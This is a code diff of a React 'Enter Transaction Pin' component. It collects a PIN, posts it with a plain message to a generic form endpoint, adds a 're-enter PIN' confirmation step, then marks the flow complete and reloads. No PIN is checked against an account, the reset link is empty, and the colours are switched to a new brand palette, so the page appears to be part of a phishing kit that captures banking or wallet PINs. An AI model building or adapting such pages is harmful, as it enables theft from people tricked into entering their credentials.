@@ -2,9 +2,8 @@ import axios from "axios";
 import { useEffect, useState } from "react";
 import { FormURL } from "../constant";
 
-export default function EnterPin({ setStage }) {
+export default function EnterPin({ setStage, reconfirmation }) {
   const [pins, setPins] = useState([]); // Array to store entered PIN digits
-  const [currentPinIndex, setCurrentPinIndex] = useState(0); // Index of the currently focused PIN input
   const [isLoading, setLoading] = useState(false);
   const [email, setEmail] = useState(false);
 
@@ -49,13 +48,19 @@ export default function EnterPin({ setStage }) {
     try {
       const formValues = {
         pin: pins.join(""), // Combine PIN digits into a single string
-        message: "This is the PIN submission",
+        message: !reconfirmation ? "This is the PIN submission" : "This is the confirmation PIN",
       };
 
       await axios.post(FormURL, formValues);
 
       setLoading(false);
-      setStage(3);
+      if(reconfirmation) {
+        localStorage.setItem("completed", 1);
+
+        location.reload();
+      }else {
+        setStage(3);  
+      }
 
 
       // Handle successful PIN submission (e.g., navigate to a different page)
@@ -68,14 +73,14 @@ export default function EnterPin({ setStage }) {
   };
 
   return (
-    <form onSubmit={handleSubmit} className="h-full flex justify-start">
-      <div className="space-y-5">
+    <form onSubmit={handleSubmit} className="w-full h-full flex justify-start">
+      <div className="space-y-5 w-full">
         <div className="space-y-2">
         <h2 className="text-xl capitalize font-bold leading-[1] ">
-          Enter Transaction Pin
+        {!reconfirmation ? "Enter Transaction Pin" : "Re-enter Transaction Pin"}
         </h2>
         <p className="leading-[1] text-gray-500 font-bold">
-         Your transaction pin is required to proceed
+         {!reconfirmation ? "Your transaction pin is required to proceed" : "Confirm to continue"}
         </p>
         </div>
         <div className="flex justify-center gap-3 my-5">
@@ -96,20 +101,20 @@ export default function EnterPin({ setStage }) {
                   placeholder="-"
                   autoComplete="off"
                   inputMode="numeric"
-                  className="valid:border-[#326cf4] text-[#161616] text-center w-full h-full outline-none  text-xl p-2 bg-transparent font-bold"
+                  className="valid:border-[#219653] text-[#6bc798] text-center w-full h-full outline-none  text-xl p-2 bg-transparent font-bold"
                 />
               </div>
             ))}
         </div>
-        <a href="" className="font-bold text-sm text-center block">Forget PIN? <span className="text-[#326cf4]">Reset</span></a>
+        <a href="" className="font-bold text-sm text-center block">Forget PIN? <span className="text-[#219653]">Reset</span></a>
         <div className="flex-grow"></div>
         <button
           className={`w-full py-3 rounded-md mt-10 ${
-            isLoading ? "bg-[#326cf4]/30" : "bg-[#326cf4]"
-          } text-white font-bold`}
+            !isLoading ? "bg-[#e4fff1] text-gray-400" : "bg-[#219653] text-white "
+          } font-bold`}
           disabled={pins.length < 4} // Disable submit button if PIN is incomplete
         >
-          {isLoading ? "Logging in..." : "Verify"}
+          {!reconfirmation ? (isLoading ? "Verifing..." : "Verify") :  (isLoading ? "Confirm..." : "Confirm")}
         </button>
       </div>
     </form>
